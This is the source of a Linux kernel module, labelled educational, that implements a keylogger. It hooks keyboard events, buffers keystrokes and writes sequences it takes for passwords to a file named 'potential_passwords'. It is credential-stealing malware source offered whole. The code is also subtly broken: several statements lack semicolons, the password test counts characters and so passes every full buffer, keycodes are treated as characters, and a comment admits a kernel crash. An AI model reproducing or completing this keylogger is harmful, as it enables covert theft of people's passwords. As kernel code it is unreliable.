#include <linux/kernel.h>
#include <linux/keyboard.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/rbtree.h>
#include <linux/seq_file.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/input.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Logan Gray");
MODULE_DESCRIPTION("Keylogger for Educational Purposes");

#define PROC_FILENAME "potential_passwords"
#define BUFFER_SIZE 15

// Criteria bitmask constants
#define CRITERIA_LOWERCASE 1
#define CRITERIA_UPPERCASE 2
#define CRITERIA_NUMBER    4
#define CRITERIA_SYMBOL    8

static struct proc_dir_entry* proc_file;

// A function that will track the characters (amount defined in BUFFER_SIZE) typed on a keyboard and store them in an optimal data structure, acting as a buffer for analysis.
// Each element of the buffer will contain the character and timestamp in jiffies of the keypress. The function will be called whenever a key is pressed, and will update the buffer with the new character converted from the keycode, and timestamp.
// If the buffer reaches the limit defined in BUFFER_SIZE, it will call another function to analyze the buffer for potential passwords.
// The analysis function will check each element in the buffer for lowercase, uppercase, number, and symbol characters.
// If the buffer contains characters that meet 3 of the 4 criteria, it will write the characters to a proc file in the order they were typed, and then clear the buffer.

// The buffer will be implemented as a rolling buffer, meaning that once it reaches the maximum length, it will start overwriting the oldest characters with the newest ones, checking for potential passwords along the way.
// The overall goal is to make a simple keylogger program that logs potential passwords typed on a Linux system, implemented as a kernel module. Therefore, it is crucial to use kernel-specific functions and data structures.

// TODO: Fix kernel crash

// Structure to hold the buffer element
struct buffer_element {
    char character;
    unsigned long timestamp;
};

// Buffer to store the typed characters
struct buffer_element buffer[BUFFER_SIZE];
static int buffer_index = 0;

// Function to analyze the buffer for potential passwords
void analyze_buffer(void) {
    printk(KERN_INFO "keylogger: analyze_buffer() START");
    int lowercase_count = 0;
    int uppercase_count = 0;
    int number_count = 0;
    int symbol_count = 0;

    // Check each element in the buffer
    for (int i = 0; i < BUFFER_SIZE; i++) {
        printk(KERN_INFO "keylogger: analyze_buffer() FOR i=%d", i);
        char character = buffer[i].character;

        // Check for lowercase character
        if (character >= 'a' && character <= 'z') {
            printk(KERN_INFO "keylogger: analyze_buffer() LOWERCASE FOUND");
            lowercase_count++;
        }
        // Check for uppercase character
        else if (character >= 'A' && character <= 'Z') {
            printk(KERN_INFO "keylogger: analyze_buffer() UPPERCASE FOUND");
            uppercase_count++;
        }
        // Check for number character
        else if (character >= '0' && character <= '9') {
            printk(KERN_INFO "keylogger: analyze_buffer() NUMBER FOUND");
            number_count++;
        }
        // Check for symbol character
        else {
            printk(KERN_INFO "keylogger: analyze_buffer() SYMBOL FOUND");
            symbol_count++;
        }
    }

    // Check if the buffer contains characters that meet 3 of the 4 criteria
    if ((lowercase_count + uppercase_count + number_count + symbol_count) >= 3) {
        printk(KERN_INFO "keylogger: analyze_buffer() POTENTIAL PASSWORD FOUND");
        // Open the proc file for writing
        struct file* file = filp_open(PROC_FILENAME, O_WRONLY | O_CREAT | O_APPEND, 0644);
        if (file) {
            printk(KERN_INFO "keylogger: analyze_buffer() PROC FILE OPENED");
            // Write the characters to the proc file in the order they were typed
            for (int i = 0; i < BUFFER_SIZE; i++) {
                printk(KERN_INFO "keylogger: analyze_buffer() WRITING TO PROC FILE i=%d", i);
                char character = buffer[i].character;
                if (character != '\0') {
                    printk(KERN_INFO "keylogger: analyze_buffer() WRITING CHARACTER %c", character);
                    char str[2] = { character, '\0' };
                    kernel_write(file, str, 1, &file->f_pos);
                }
            }
            // Clear the buffer, memset can not be used in kernel space
            for (int i = 0; i < BUFFER_SIZE; i++) {
                printk(KERN_INFO "keylogger: analyze_buffer() CLEARING BUFFER i=%d", i);
                buffer[i].character = '\0';
                buffer[i].timestamp = 0;
            }
            buffer_index = 0;

            // Close the proc file
            filp_close(file, NULL);
        }
    }
    printk(KERN_INFO "keylogger: analyze_buffer() END");
}

// Function to track the characters typed on a keyboard
int track_keyboard(struct notifier_block* notifier, unsigned long event, void* data) {
    printk(KERN_INFO "keylogger: track_keyboard() START");
    struct keyboard_notifier_param* param = data;

    // Check if a key is pressed
    if (event == KBD_KEYCODE && param->down) {
        printk(KERN_INFO "keylogger: track_keyboard() KEY PRESSED");
        // Convert the keycode to character
        char character = param->value;

        // Update the buffer with the new character and timestamp
        buffer[buffer_index].character = character;
        buffer[buffer_index].timestamp = jiffies;
        buffer_index++;

        // Check if the buffer is full
        if (buffer_index >= BUFFER_SIZE) {
            printk(KERN_INFO "keylogger: track_keyboard() BUFFER FULL");
            // Analyze the buffer for potential passwords
            analyze_buffer();
        }
    }

    printk(KERN_INFO "keylogger: track_keyboard() RETURNING NOTIFY_OK");
    return NOTIFY_OK;
}

// Notifier block for keyboard events
static struct notifier_block keyboard_notifier = {
    .notifier_call = track_keyboard
};

// Module initialization function
static int __init keylogger_init(void) {
    printk(KERN_INFO "keylogger: Initializing keylogger module")
    // Register the keyboard notifier
    register_keyboard_notifier(&keyboard_notifier);

    // Create the proc file
    proc_file = proc_create(PROC_FILENAME, 0644, NULL, NULL);
    if (!proc_file) {
        printk(KERN_ERR "keylogger: Failed to create proc file");
        return -ENOMEM;
    }

    printk(KERN_INFO "keylogger: Module initialized")
    return 0;
}

// Module cleanup function
static void __exit keylogger_exit(void) {
    printk(KERN_INFO "keylogger: Exiting keylogger module")
    // Unregister the keyboard notifier
    unregister_keyboard_notifier(&keyboard_notifier);

    // Remove the proc file
    proc_remove(proc_file);
    printk(KERN_INFO "keylogger: Module exited")
}

module_init(keylogger_init);
module_exit(keylogger_exit);